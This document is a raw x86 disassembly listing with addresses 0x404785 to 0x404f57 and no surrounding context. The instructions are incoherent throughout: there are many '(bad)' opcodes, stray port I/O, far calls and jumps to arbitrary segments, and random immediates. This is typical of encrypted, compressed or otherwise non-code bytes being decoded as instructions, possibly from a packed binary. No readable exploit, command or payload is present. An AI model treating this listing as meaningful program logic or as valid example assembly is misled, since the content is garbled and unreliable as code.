  404785:	sbb    esp,DWORD PTR [esi]
  404787:	and    DWORD PTR [ecx+0x2449ca0d],0x48f84b36
  404791:	dec    eax
  404792:	jge    0x404790
  404794:	retf   0x9487
  404797:	dec    esi
  404798:	je     0x404784
  40479a:	and    al,0x5
  40479c:	dec    ebp
  40479d:	scas   eax,DWORD PTR es:[edi]
  40479e:	test   eax,0xae83df28
  4047a3:	stos   DWORD PTR es:[edi],eax
  4047a4:	dec    edx
  4047a5:	lds    eax,FWORD PTR [ecx+edi*8+0x25]
  4047a9:	popa   
  4047aa:	add    bh,BYTE PTR [ebx+ecx*1]
  4047ad:	imul   ebx,DWORD PTR [ecx],0x8e2a24fc
  4047b3:	push   esp
  4047b4:	xor    BYTE PTR [ebx],0x32
  4047b7:	call   0x58b623ee
  4047bc:	sbb    cl,dl
  4047be:	in     al,dx
  4047bf:	mov    ds:0x8fc2fe31,eax
  4047c4:	data16 (bad) 
  4047c7:	push   ebx
  4047c8:	cmp    ebp,edx
  4047ca:	into   
  4047cb:	imul   edi,DWORD PTR [edi],0xb707eabe
  4047d1:	xor    DWORD PTR [ebx],0x3e
  4047d4:	jbe    0x404828
  4047d6:	mov    esp,0xad14b50c
  4047db:	mov    esi,0x9d99e677
  4047e0:	popf   
  4047e1:	cmp    DWORD PTR [edx],edx
  4047e3:	pcmpeqb mm2,QWORD PTR [eax-0x6fd9f89a]
  4047ea:	retf   0x7458
  4047ed:	out    dx,al
  4047ee:	xchg   esp,eax
  4047ef:	imul   edx,DWORD PTR [edi+edi*4],0xffffffec
  4047f3:	adc    ch,BYTE PTR [ebx]
  4047f5:	add    BYTE PTR ds:0x18cfd3cb,dh
  4047fb:	ss xor cl,ch
  4047fe:	(bad)  
  4047ff:	stos   BYTE PTR es:[edi],al
  404800:	cmp    eax,0x1ebadcf4
  404805:	popa   
  404806:	jns    0x4047a5
  404808:	dec    ecx
  404809:	rcl    DWORD PTR [ecx+0x40],1
  40480c:	leave  
  40480d:	jno    0x404812
  40480f:	into   
  404810:	sub    esi,DWORD PTR [esi]
  404812:	fidivr WORD PTR [ecx+0x1bbbe6d1]
  404818:	je     0x4047fa
  40481a:	les    ebp,FWORD PTR [eax-0x14]
  40481d:	es push ebx
  40481f:	mov    edx,0xfea23d8e
  404824:	imul   eax,DWORD PTR [edx+esi*1],0xfe04e0fa
  40482b:	dec    edi
  40482c:	shl    DWORD PTR [eax+0xb8cdf0e],cl
  404832:	fwait
  404833:	mov    ds:0xd0aae8ca,al
  404838:	push   esp
  404839:	ror    bl,cl
  40483b:	mov    dl,0x85
  40483d:	fs inc ebx
  40483f:	popf   
  404840:	xchg   ecx,eax
  404841:	test   DWORD PTR ds:0xfdd3bb7,ebp
  404847:	or     esi,DWORD PTR [ecx-0x2fc12708]
  40484d:	adc    bh,BYTE PTR [ebx+0x491b3846]
  404853:	mov    al,0x5f
  404855:	sets   BYTE PTR [eax]
  404858:	das    
  404859:	loop   0x404824
  40485b:	shl    DWORD PTR [eax+esi*1+0x751b84f2],cl
  404862:	imul   ecx,DWORD PTR [edx],0xb682a5ec
  404868:	adc    esi,edi
  40486a:	sub    al,BYTE PTR ds:0xe91c7c70
  404870:	inc    edi
  404871:	pusha  
  404872:	jno    0x40488e
  404874:	pop    esp
  404875:	mov    al,ds:0x2d3ce83a
  40487a:	pop    esi
  40487b:	mov    al,BYTE PTR ds:0x490f1c10
  404881:	add    cl,bh
  404883:	pushf  
  404884:	inc    esp
  404885:	scas   eax,DWORD PTR es:[edi]
  404886:	mov    esi,0x8d1fc1f3
  40488b:	sar    BYTE PTR ds:[ebp+edx*1+0xa47dba2],1
  404893:	cmp    dh,dh
  404895:	ror    DWORD PTR ss:[ecx-0x2c],cl
  404899:	bound  esi,QWORD PTR [ebx-0x3e]
  40489c:	sbb    al,0xae
  40489f:	mov    ecx,0xf6fc5fed
  4048a4:	cmp    esi,esp
  4048a6:	push   edx
  4048a7:	mov    ecx,0xa36c8f68
  4048ac:	loope  0x404874
  4048ae:	inc    esp
  4048af:	xchg   ebp,eax
  4048b0:	pop    es
  4048b1:	into   
  4048b2:	scas   eax,DWORD PTR es:[edi]
  4048b3:	retf   
  4048b4:	mov    ah,0x86
  4048b6:	add    edi,DWORD PTR [esi+ebp*2+0x5e5b50f5]
  4048bd:	sub    ah,BYTE PTR [esi+eiz*1+0x3]
  4048c1:	sbb    al,0xb7
  4048c3:	xchg   esi,eax
  4048c4:	or     al,0x28
  4048c6:	or     al,0x64
  4048c8:	push   ecx
  4048c9:	or     al,0xcd
  4048cb:	fimul  WORD PTR [ebp+0x3597c48e]
  4048d1:	add    al,0x20
  4048d3:	push   ds
  4048d4:	sbb    esp,DWORD PTR [eax-0x60564e5e]
  4048da:	(bad)  
  4048db:	jo     0x40489f
  4048dd:	call   0x473e:0x4ce1e5d1
  4048e4:	daa    
  4048e5:	dec    ebp
  4048e6:	sub    BYTE PTR [edi+0x72028b59],cl
  4048ec:	and    eax,0x8466a595
  4048f1:	popf   
  4048f2:	pop    edx
  4048f3:	push   eax
  4048f4:	dec    esi
  4048f5:	jnp    0x4048e2
  4048f7:	jae    0x404909
  4048f9:	and    ebx,DWORD PTR [edx+ebp*2-0x2e]
  4048fd:	fs xchg esp,eax
  4048ff:	int    0x19
  404901:	hlt    
  404902:	xchg   esp,eax
  404903:	xchg   edx,eax
  404904:	sti    
  404905:	mov    edx,0x82db77d3
  40490a:	sbb    eax,0x53d3ca8c
  40490f:	cmp    BYTE PTR [esi],bl
  404911:	stos   DWORD PTR es:[edi],eax
  404912:	lea    ebp,[eax-0x7b]
  404915:	cmp    esp,DWORD PTR [ecx+0x38]
  404918:	xor    eax,0x864072bc
  40491d:	int3   
  40491e:	in     eax,0x1d
  404920:	add    bh,ch
  404922:	xor    DWORD PTR [esi+eax*8],ebx
  404925:	and    eax,0x23a7c9bd
  40492a:	sub    DWORD PTR [edx-0x69efc99d],esp
  404930:	add    ebp,ebx
  404932:	jl     0x404943
  404934:	es inc esp
  404936:	hlt    
  404937:	sub    al,0xa6
  404939:	cmp    edi,DWORD PTR [ebp+0x4b4ebd8]
  40493f:	rcl    BYTE PTR [ebp-0x53],cl
  404942:	icebp  
  404943:	push   0xe785eb88
  404948:	lea    esi,[eax+0x38edc6c]
  40494e:	mov    cl,0xf0
  404950:	in     al,dx
  404951:	(bad)  
  404952:	ror    DWORD PTR [eax+0x7c51dc39],0x6a
  404959:	repz in al,0xce
  40495c:	push   ebx
  40495d:	sbb    al,0x2f
  40495f:	xor    edi,DWORD PTR [edx]
  404961:	sub    ebx,edx
  404963:	mov    ebp,0xf89c817e
  404968:	xchg   ecx,eax
  404969:	xor    esp,DWORD PTR [ebp-0x538b40d3]
  40496f:	rcr    BYTE PTR [ebx-0x78],0xdc
  404973:	push   ss
  404974:	pop    ebp
  404975:	ss ffree st(0)
  404978:	fiadd  DWORD PTR [esi+ebp*1]
  40497b:	cmp    DWORD PTR [ecx-0x453ff75e],0xda69495d
  404985:	push   ds
  404986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404987:	mov    DWORD PTR [ebx+0x2d6fda37],ecx
  40498d:	pop    ecx
  40498e:	inc    ebx
  40498f:	sub    ebp,DWORD PTR [edi]
  404991:	and    al,0xb2
  404993:	hlt    
  404994:	or     al,dl
  404996:	push   esi
  404997:	mov    edi,0xa2eb2cd4
  40499c:	test   eax,0x5908222
  4049a1:	les    edi,FWORD PTR [ebx]
  4049a3:	sbb    ch,bl
  4049a5:	sbb    BYTE PTR [ebp+0x3a],0x76
  4049a9:	jp     0x404942
  4049ab:	outs   dx,DWORD PTR ds:[esi]
  4049ac:	bound  ebp,QWORD PTR [ebp+0x61]
  4049af:	cmp    eax,0x3ba92661
  4049b4:	out    0x72,eax
  4049b6:	inc    ebx
  4049b7:	cmp    BYTE PTR [esi+0x5edff30a],ch
  4049bd:	and    BYTE PTR [ebp+0x5f],0xa0
  4049c1:	ret    
  4049c2:	add    al,0x12
  4049c4:	test   BYTE PTR [edi+0x29],bl
  4049c7:	adc    BYTE PTR [ecx+0xc],dh
  4049ca:	lods   al,BYTE PTR ds:[esi]
  4049cb:	dec    ebx
  4049cc:	sbb    cl,ah
  4049ce:	aam    0xb2
  4049d0:	popf   
  4049d1:	addr16 jae 0x4049e4
  4049d4:	jmp    0x12b09df4
  4049d9:	dec    esp
  4049da:	lea    edx,[edi-0x5263b3b4]
  4049e0:	push   ds
  4049e1:	jmp    0x8f6a6eb6
  4049e6:	add    eax,0x34db3705
  4049eb:	mov    ds:0xdca8e3da,al
  4049f0:	xchg   DWORD PTR [ebp-0x14],eax
  4049f3:	inc    edx
  4049f4:	push   ebp
  4049f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049f6:	rol    BYTE PTR [ecx+0x54e5e62a],0x5f
  4049fd:	mov    eax,ds:0x631fa29a
  404a02:	jnp    0x4049cb
  404a04:	(bad)
  404a09:	(bad)  [eax-0x6a8e3fcb]
  404a0f:	xor    DWORD PTR [ebp-0x23b3c6eb],ebp
  404a15:	cmp    dh,al
  404a17:	aaa    
  404a18:	or     ch,BYTE PTR [eax-0x4]
  404a1b:	inc    ecx
  404a1c:	jbe    0x4049ca
  404a1e:	push   edx
  404a1f:	cmp    BYTE PTR [esi-0x617faa51],dl
  404a25:	les    eax,FWORD PTR [ebx*8-0x7a18f612]
  404a2c:	jbe    0x404a6e
  404a2e:	sar    bl,0x3
  404a31:	in     eax,0x2f
  404a33:	xchg   edi,eax
  404a34:	jle    0x404aa4
  404a36:	in     al,dx
  404a37:	jmp    0xf1717b5
  404a3c:	mov    ebp,0x35174826
  404a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a42:	inc    esi
  404a43:	in     eax,0x72
  404a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a46:	ret    
  404a47:	das    
  404a48:	pop    ebp
  404a49:	jno    0x404a25
  404a4b:	mov    ebx,0xe0df6064
  404a50:	mov    esi,0xf6e3a952
  404a55:	int3   
  404a56:	dec    eax
  404a57:	rol    BYTE PTR [ebx-0x2c],cl
  404a5a:	inc    ebx
  404a5b:	jge    0x404a0a
  404a5d:	sub    DWORD PTR [ebp-0x17e18bb2],ebp
  404a63:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a65:	push   0xffffffda
  404a67:	or     edi,eax
  404a69:	sub    DWORD PTR [esi-0x48a9f843],esp
  404a6f:	call   0x2f99:0x2effa3d9
  404a76:	(bad)  
  404a77:	pusha  
  404a78:	xor    dl,bl
  404a7a:	mov    ebx,0xd74d24c6
  404a7f:	jle    0x404a40
  404a81:	cmp    edx,ecx
  404a83:	fild   DWORD PTR [eax+ebp*1+0x17e4acce]
  404a8a:	push   eax
  404a8b:	adc    DWORD PTR [esi-0x29b585c9],eax
  404a91:	rol    BYTE PTR [ebx],cl
  404a93:	arpl   WORD PTR [ebp+0x26e74336],bx
  404a99:	xor    ecx,eax
  404a9b:	stos   BYTE PTR es:[edi],al
  404a9c:	lods   al,BYTE PTR ds:[esi]
  404a9d:	or     eax,0x16ab6817
  404aa2:	sbb    cl,BYTE PTR [ebx]
  404aa4:	jbe    0x404a5b
  404aa6:	and    DWORD PTR [eax-0x42],eax
  404aa9:	and    edi,0xa847f5bf
  404aaf:	sti    
  404ab0:	mov    esp,ss
  404ab2:	ja     0x404ac6
  404ab4:	xchg   ebx,eax
  404ab5:	cwde   
  404ab6:	out    0x8b,al
  404ab8:	fwait
  404ab9:	retf   0xb55c
  404abc:	into   
  404abd:	cmp    ebp,edi
  404abf:	test   al,0x44
  404ac1:	jns    0x404b3c
  404ac3:	aam    0xe8
  404ac5:	sub    BYTE PTR [edx+ebx*4-0x347fdf8],0x56
  404acd:	retf   
  404ace:	sbb    bh,al
  404ad0:	xlat   BYTE PTR ds:[ebx]
  404ad1:	xor    ecx,esi
  404ad3:	addr16 out dx,ax
  404ad6:	(bad)  
  404ad7:	call   0xe59d:0x53d2e08f
  404ade:	push   ss
  404adf:	and    DWORD PTR [edi],ebp
  404ae1:	jg     0x404a89
  404ae3:	inc    ebp
  404ae4:	pop    es
  404ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae6:	popf   
  404ae7:	cli    
  404ae8:	rol    cl,1
  404aea:	imul   edi,ecx,0xffffffe9
  404aed:	xor    eax,0x237a25a8
  404af2:	unpcklps xmm0,XMMWORD PTR [eax+ebx*4-0x30f8ac8f]
  404afa:	add    BYTE PTR [ebp+0x4f],al
  404afd:	add    ah,BYTE PTR [esi+0xac9d804]
  404b03:	inc    edx
  404b04:	push   0x58
  404b06:	pop    ebp
  404b07:	xchg   esp,eax
  404b08:	adc    DWORD PTR [esi+0x5aca86df],ebp
  404b0e:	daa    
  404b0f:	neg    ebx
  404b11:	ror    BYTE PTR [edx+0x5a],cl
  404b14:	jnp    0x404b50
  404b16:	push   es
  404b17:	(bad)  
  404b18:	fldl2t 
  404b1a:	dec    edx
  404b1b:	rol    BYTE PTR [eax],1
  404b1d:	nop
  404b1e:	cmp    edx,DWORD PTR [esi-0x70cf5a8a]
  404b24:	call   0xa91881c0
  404b29:	fwait
  404b2a:	inc    esp
  404b2b:	imul   esi,DWORD PTR [edi-0x40],0xffffff9f
  404b2f:	xchg   ebx,eax
  404b30:	inc    edi
  404b31:	imul   eax,esp,0xa15c0b48
  404b37:	cmp    cl,BYTE PTR [edx]
  404b39:	(bad)
  404b3c:	repnz xor esp,DWORD PTR [esi+0x33]
  404b40:	sti    
  404b41:	mov    esp,0xcbdfd934
  404b46:	(bad)  
  404b47:	mov    esi,0x977a14d2
  404b4d:	fnstcw WORD PTR [edx]
  404b4f:	pop    ecx
  404b50:	jmp    0x4dae0eb9
  404b55:	data16 into 
  404b57:	fxch   st(3)
  404b59:	or     eax,0xbbbc31b4
  404b5e:	fidiv  WORD PTR [eax]
  404b60:	jnp    0x404b6a
  404b62:	mov    esp,0x1f9d6ac
  404b67:	hlt    
  404b68:	sub    ebp,DWORD PTR ss:[esi+0x251d031d]
  404b6f:	jge    0x404ba4
  404b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b72:	fisttp QWORD PTR [edx+0x5c]
  404b75:	xor    eax,0xcbd6afd2
  404b7a:	and    DWORD PTR [edx+0x4f],edx
  404b7d:	and    al,0xca
  404b7f:	pop    es
  404b80:	dec    esp
  404b81:	mov    dl,0x16
  404b83:	fcmovnbe st,st(0)
  404b85:	scas   al,BYTE PTR es:[edi]
  404b86:	sahf   
  404b87:	xchg   esp,eax
  404b88:	jmp    0xc532fda6
  404b8d:	add    ch,BYTE PTR [ebp+0x65]
  404b90:	mov    eax,0x65b9d7d
  404b95:	stc    
  404b96:	aam    0x58
  404b98:	test   al,0x6d
  404b9a:	sbb    eax,0x26624988
  404b9f:	clc    
  404ba0:	(bad)  
  404ba1:	mov    edx,0xc083b8e6
  404ba6:	hlt    
  404ba7:	ins    DWORD PTR es:[edi],dx
  404ba8:	adc    BYTE PTR [eax-0x75],0xb6
  404bac:	stc    
  404bad:	shr    DWORD PTR [ecx],1
  404baf:	in     al,0x45
  404bb1:	les    edi,FWORD PTR [ecx]
  404bb3:	and    al,0xcb
  404bb5:	bound  ebx,QWORD PTR [esi]
  404bb7:	les    esp,FWORD PTR [edi-0x11]
  404bba:	push   ss
  404bbb:	adc    ebx,DWORD PTR ds:0xbeeef12b
  404bc1:	mov    cl,0x62
  404bc3:	lock cmp ah,0x5c
  404bc7:	jl     0x404c12
  404bc9:	and    eax,0x81e75110
  404bce:	in     al,0x28
  404bd0:	inc    esp
  404bd1:	lods   eax,DWORD PTR ds:[esi]
  404bd2:	mov    ebx,0x622b9e64
  404bd7:	(bad)  
  404bd9:	cmp    ebx,edi
  404bdb:	push   edx
  404bdc:	or     dh,BYTE PTR [edx-0x27be1a35]
  404be2:	es push 0xfffffff9
  404be5:	jmp    0x21a33612
  404bea:	repz or BYTE PTR [ebx+0x38b50b4a],bh
  404bf1:	and    al,0x68
  404bf3:	pop    eax
  404bf4:	sub    eax,0xc3a35d47
  404bf9:	lock jg 0x404bfe
  404bfc:	aas    
  404bfd:	rol    BYTE PTR [edx],0x1f
  404c00:	fld    DWORD PTR [esi-0x8]
  404c03:	dec    eax
  404c04:	dec    esp
  404c05:	inc    ebx
  404c06:	xchg   dl,bh
  404c08:	pop    edx
  404c09:	jmp    0x404c67
  404c0b:	cmp    BYTE PTR [ebx-0x34],dl
  404c0e:	xor    BYTE PTR [ebx+0x7f],0xc2
  404c12:	sub    BYTE PTR [ebx+0x5],dl
  404c15:	inc    esp
  404c16:	or     edi,DWORD PTR [ecx+0x64ce5dbe]
  404c1c:	(bad)  
  404c1d:	and    dl,BYTE PTR [ebp-0x5a24d0dc]
  404c23:	scas   al,BYTE PTR es:[edi]
  404c24:	outs   dx,BYTE PTR ds:[esi]
  404c25:	imul   esi,DWORD PTR [ebp+0x6b],0x9773d462
  404c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2d:	xor    eax,DWORD PTR [esi]
  404c2f:	addr16 xchg edx,eax
  404c31:	cmp    al,0x86
  404c33:	in     eax,dx
  404c34:	cmp    DWORD PTR [edi+0x43],esi
  404c37:	push   ds
  404c38:	xor    al,BYTE PTR ds:0xac2fdf4d
  404c3e:	pop    edx
  404c3f:	pop    esi
  404c40:	jno    0x404bcc
  404c42:	not    DWORD PTR [edi-0x541f11f]
  404c48:	mov    ds:0xabc954de,al
  404c4d:	cli    
  404c4e:	push   0x428f311c
  404c53:	adc    BYTE PTR [eax],ah
  404c55:	jb     0x404cc6
  404c57:	mov    ds:0xfc446a85,eax
  404c5c:	mov    al,0xd3
  404c5e:	and    al,0x1a
  404c60:	mov    cl,BYTE PTR [edi]
  404c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c63:	and    eax,0x6b841860
  404c68:	scas   al,BYTE PTR es:[edi]
  404c69:	in     al,0x13
  404c6b:	push   ebx
  404c6c:	stos   DWORD PTR es:[edi],eax
  404c6d:	js     0x404c4d
  404c6f:	add    bl,BYTE PTR [ebx]
  404c71:	in     eax,0xdc
  404c73:	in     eax,0x7
  404c75:	ds mov ecx,0x2993b8b9
  404c7b:	mov    dh,0x95
  404c7d:	and    al,0x94
  404c7f:	xlat   BYTE PTR ds:[ebx]
  404c80:	adc    esi,edx
  404c82:	sub    eax,0x170d7551
  404c87:	dec    ebx
  404c88:	out    0x69,eax
  404c8a:	jmp    0x64fd36d8
  404c8f:	xchg   ebx,eax
  404c90:	or     DWORD PTR [edi],ecx
  404c92:	sub    ah,BYTE PTR [edx-0x176042e2]
  404c98:	or     eax,0x3dc82702
  404c9d:	sub    BYTE PTR [ebp+0x7686bb56],bh
  404ca3:	push   edx
  404ca4:	mov    ?,WORD PTR ds:0x7aa0cdc1
  404caa:	out    0xdc,al
  404cac:	cs mov ebp,0x27fe9130
  404cb2:	lock (bad) 
  404cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cb5:	std    
  404cb6:	es xchg esi,eax
  404cb8:	push   ss
  404cb9:	pop    esp
  404cba:	and    ecx,DWORD PTR [edx]
  404cbc:	inc    eax
  404cbd:	and    BYTE PTR [ebp+ebx*8+0x6b1881d5],ch
  404cc4:	mov    dl,BYTE PTR [eax]
  404cc6:	push   ds
  404cc7:	fld    st(6)
  404cc9:	lods   al,BYTE PTR ds:[esi]
  404cca:	fist   DWORD PTR [edi+eax*8+0x72524e8d]
  404cd1:	lahf   
  404cd2:	outs   dx,BYTE PTR ds:[esi]
  404cd3:	add    ah,BYTE PTR [edi]
  404cd5:	push   esp
  404cd6:	enter  0x843b,0x6
  404cda:	jge    0x404d3f
  404cdc:	xchg   BYTE PTR [edi-0x1a],dl
  404cdf:	adc    BYTE PTR [ebx+0x524657f5],dh
  404ce5:	add    DWORD PTR [esi],ecx
  404ce7:	js     0x404ce3
  404ce9:	or     DWORD PTR [edi+0xc],ebp
  404cec:	ss jae 0x404d43
  404cef:	xlat   BYTE PTR ds:[ebx]
  404cf0:	inc    ebx
  404cf1:	out    dx,al
  404cf2:	mov    edx,0x797b2e5d
  404cf7:	das    
  404cf8:	in     eax,dx
  404cf9:	jl     0x404d64
  404cfb:	dec    edx
  404cfc:	daa    
  404cfd:	js     0x404ca0
  404cff:	lock leave 
  404d01:	pop    es
  404d02:	std    
  404d03:	sbb    eax,0x5311ab29
  404d08:	out    dx,eax
  404d09:	add    al,BYTE PTR [ebx-0x71]
  404d0c:	sar    DWORD PTR [ebx-0x2f],0x30
  404d10:	sub    dl,BYTE PTR [ecx]
  404d12:	or     BYTE PTR [eax+0x3c],al
  404d15:	sub    al,0xde
  404d17:	mov    ch,ah
  404d19:	clc    
  404d1a:	push   eax
  404d1b:	mov    WORD PTR [esi],ss
  404d1d:	stos   DWORD PTR es:[edi],eax
  404d1e:	(bad)  
  404d1f:	call   0xf859:0x42a90479
  404d26:	scas   eax,DWORD PTR es:[edi]
  404d27:	dec    esp
  404d28:	dec    eax
  404d29:	push   esi
  404d2a:	or     eax,0x5a1689df
  404d2f:	xlat   BYTE PTR ds:[ebx]
  404d30:	push   cs
  404d31:	sbb    eax,eax
  404d33:	outs   dx,BYTE PTR ds:[esi]
  404d34:	xor    dl,BYTE PTR [esi-0x52f792c4]
  404d3a:	mov    edx,0xe5de66fd
  404d3f:	xchg   edx,eax
  404d40:	(bad)  
  404d41:	lds    ebx,FWORD PTR [ebx]
  404d43:	lds    ebx,FWORD PTR [eax]
  404d45:	(bad)  
  404d46:	adc    al,0x37
  404d48:	retf   0x3d20
  404d4b:	out    0xe6,eax
  404d4d:	dec    eax
  404d4e:	jno    0x404d54
  404d50:	and    DWORD PTR [eax-0x79],ebx
  404d53:	popa   
  404d54:	inc    esp
  404d55:	adc    al,0xf9
  404d57:	and    eax,0x590ef4c7
  404d5c:	fcmove st,st(6)
  404d5e:	inc    esi
  404d5f:	sbb    eax,0x5e60fd51
  404d64:	es push 0x59
  404d67:	xchg   DWORD PTR [ecx],edi
  404d69:	enter  0x6f63,0xee
  404d6d:	mov    eax,0xf3408f79
  404d72:	add    edi,DWORD PTR [ecx]
  404d74:	jno    0x404d8d
  404d76:	pusha  
  404d77:	jno    0x404d53
  404d79:	test   esi,edi
  404d7b:	enter  0x3454,0xf8
  404d7f:	pop    ss
  404d80:	(bad)  
  404d81:	out    dx,al
  404d82:	inc    edi
  404d83:	outs   dx,BYTE PTR ds:[esi]
  404d84:	pop    esp
  404d85:	test   eax,0xc15908b3
  404d8a:	test   eax,0x516636e2
  404d8f:	sbb    eax,0xc779cbae
  404d94:	int3   
  404d95:	jo     0x404e09
  404d97:	cld    
  404d98:	fist   DWORD PTR [ecx+0x47af5770]
  404d9e:	pop    edi
  404d9f:	sbb    edi,DWORD PTR [ecx]
  404da1:	inc    ecx
  404da2:	mov    ebx,0x88b22632
  404da7:	repnz cld 
  404da9:	mov    bh,0xe5
  404dab:	test   BYTE PTR [edx+esi*8],0xf
  404daf:	or     BYTE PTR fs:[edi+0x17],bh
  404db3:	or     DWORD PTR [ecx-0x40],ecx
  404db6:	out    0x72,eax
  404db8:	hlt    
  404db9:	or     BYTE PTR [edx],bl
  404dbb:	call   0x62db12fa
  404dc0:	adc    DWORD PTR [ecx-0xd4dac91],0x4a
  404dc7:	fldenv [ebx+0x12]
  404dca:	ins    DWORD PTR es:[edi],dx
  404dcb:	xor    ebx,DWORD PTR [edi]
  404dcd:	ss inc ebp
  404dcf:	repz or DWORD PTR [edi-0x2d],esi
  404dd3:	or     BYTE PTR [ecx+0x21ab6fc5],dl
  404dd9:	int3   
  404dda:	les    esi,FWORD PTR [eax+0x1eb51a41]
  404de0:	mov    eax,ds:0xe90d2c82
  404de5:	daa    
  404de6:	adc    al,0x1
  404de8:	dec    ecx
  404de9:	jmp    0x4101:0x68d6a486
  404df0:	cs ffree st(0)
  404df3:	pop    ebx
  404df4:	retf   0x2c7a
  404df7:	lods   al,BYTE PTR ds:[esi]
  404df8:	pop    ss
  404df9:	mov    fs,WORD PTR [ebx]
  404dfb:	loopne 0x404d8a
  404dfd:	and    al,0x92
  404dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e00:	push   ebp
  404e01:	out    0x5a,eax
  404e03:	(bad)  
  404e04:	push   edx
  404e05:	mov    ch,0x91
  404e07:	ret    
  404e08:	mov    dh,0x82
  404e0a:	pop    es
  404e0b:	dec    eax
  404e0c:	adc    edi,DWORD PTR [eax+ecx*1]
  404e0f:	push   0xffffffc1
  404e11:	retf   0x8b2d
  404e14:	adc    BYTE PTR [edi+ebp*8],cl
  404e17:	cmp    ecx,esi
  404e19:	jbe    0x404db2
  404e1b:	adc    al,0xa
  404e1d:	pop    esp
  404e1e:	xor    BYTE PTR [esi+0xb6bfb35],0x7
  404e25:	or     ebp,DWORD PTR [eax]
  404e27:	out    dx,eax
  404e28:	mov    al,0x19
  404e2a:	pushf  
  404e2b:	jle    0x404e65
  404e2d:	pop    ebp
  404e2e:	(bad)  
  404e2f:	sar    BYTE PTR [ebx+0x44e01e18],0x66
  404e36:	inc    BYTE PTR [edx-0x4f]
  404e39:	push   ebx
  404e3a:	(bad)  
  404e3b:	cmp    DWORD PTR [ebx-0x9],edx
  404e3e:	ss add ch,bh
  404e41:	mov    cl,0x86
  404e43:	in     eax,0x91
  404e45:	out    0xdf,al
  404e47:	dec    ebx
  404e48:	or     al,0x11
  404e4a:	fmul   DWORD PTR [ecx+0x59]
  404e4d:	dec    esp
  404e4e:	pop    es
  404e4f:	lds    ecx,FWORD PTR [esi]
  404e51:	sbb    BYTE PTR [ecx],dh
  404e53:	pop    esi
  404e54:	(bad)  
  404e55:	xchg   esp,eax
  404e56:	sub    DWORD PTR [esi],edx
  404e58:	popa   
  404e59:	lahf   
  404e5a:	mov    ebx,0xe2885619
  404e5f:	aam    0x31
  404e61:	cmp    DWORD PTR [ecx+0x5e481889],0x5a1f814d
  404e6b:	fild   WORD PTR [edi-0x1721ec0a]
  404e71:	mov    cl,0xd
  404e73:	cs push es
  404e75:	adc    BYTE PTR [ecx-0x250fe12c],al
  404e7b:	pop    edx
  404e7c:	mov    fs,esp
  404e7e:	or     eax,0x7a7d4ab5
  404e83:	mov    ebx,0xae45ecf0
  404e88:	adc    BYTE PTR [eax-0x7c4012ff],dl
  404e8e:	js     0x404e14
  404e90:	and    BYTE PTR [edx+0x24],cl
  404e93:	or     esi,DWORD PTR [edi+0x42]
  404e96:	pop    ebp
  404e97:	dec    ebx
  404e98:	and    ecx,esi
  404e9a:	inc    ecx
  404e9b:	dec    DWORD PTR [edi]
  404e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9e:	nop
  404e9f:	jne    0x404e70
  404ea1:	sahf   
  404ea2:	mov    DWORD PTR [esi+0x66],eax
  404ea5:	mov    dl,0xc
  404ea7:	jecxz  0x404e56
  404ea9:	push   0xf2f91477
  404eae:	into   
  404eaf:	cmp    BYTE PTR [edi+0x75],bl
  404eb2:	mov    edx,?
  404eb4:	jg     0x404e59
  404eb6:	pop    ecx
  404eb7:	xor    al,0x73
  404eb9:	pop    esi
  404eba:	inc    edx
  404ebb:	push   edi
  404ebc:	stc    
  404ebd:	shr    BYTE PTR [ecx-0x4a],1
  404ec0:	(bad)
  404ec4:	(bad)  
  404ec5:	fidiv  WORD PTR [esi]
  404ec7:	loopne 0x404eca
  404ec9:	cli    
  404eca:	xlat   BYTE PTR ds:[ebx]
  404ecb:	aam    0xe7
  404ecd:	aas    
  404ece:	stc    
  404ecf:	push   ebx
  404ed0:	popf   
  404ed1:	push   eax
  404ed2:	cmp    ebp,DWORD PTR [ebp+0x4f]
  404ed5:	data16 test al,0x28
  404ed8:	sbb    al,0x4c
  404eda:	xchg   esp,eax
  404edb:	pop    esp
  404edc:	sbb    al,0x50
  404ede:	and    cl,BYTE PTR [esi]
  404ee0:	stc    
  404ee1:	dec    ebp
  404ee2:	cmp    DWORD PTR [eax+0x1],esp
  404ee5:	loop   0x404f13
  404ee7:	mov    eax,ds:0xc57ded22
  404eec:	cmp    eax,0xa893e21
  404ef1:	cwde   
  404ef2:	sub    edi,DWORD PTR [eax+0x6526df07]
  404ef8:	cmp    ecx,DWORD PTR [esi+ebp*8-0x6d]
  404efc:	iret   
  404efd:	je     0x404f35
  404eff:	fiadd  WORD PTR [ebx+0x7f]
  404f02:	jg     0x404ec5
  404f04:	push   edx
  404f05:	sahf   
  404f06:	cwde   
  404f07:	pop    ebp
  404f08:	imul   eax,ebp,0xd
  404f0b:	add    edx,DWORD PTR [eax-0x37eb7685]
  404f11:	or     al,0xc9
  404f13:	xchg   DWORD PTR [ebp+0x2d07cbcf],eax
  404f19:	imul   bx,WORD PTR ds:0x3a5eb6aa,0x1ba4
  404f22:	inc    eax
  404f23:	mov    ah,0x49
  404f25:	adc    bh,BYTE PTR [eax]
  404f27:	cmp    al,0x52
  404f29:	and    dh,al
  404f2b:	mov    ecx,ecx
  404f2d:	xchg   ecx,eax
  404f2e:	and    al,0xaa
  404f30:	mov    bh,0x4e
  404f32:	lods   eax,DWORD PTR ds:[esi]
  404f33:	mov    esi,edi
  404f35:	loope  0x404f3d
  404f37:	fsub   DWORD PTR [ebx+0x23531f33]
  404f3d:	jo     0x404fbe
  404f3f:	adc    al,0x9
  404f41:	test   al,ah
  404f43:	push   ebx
  404f44:	pop    ebx
  404f45:	fucom  st(7)
  404f47:	ficomp WORD PTR [edx]
  404f49:	cli    
  404f4a:	mov    cs:0x3ef4ab99,eax
  404f50:	test   al,0xfd
  404f52:	setge  bh
  404f55:	(bad)  
  404f56:	out    dx,al
  404f57:	fild   WORD PTR [eax]
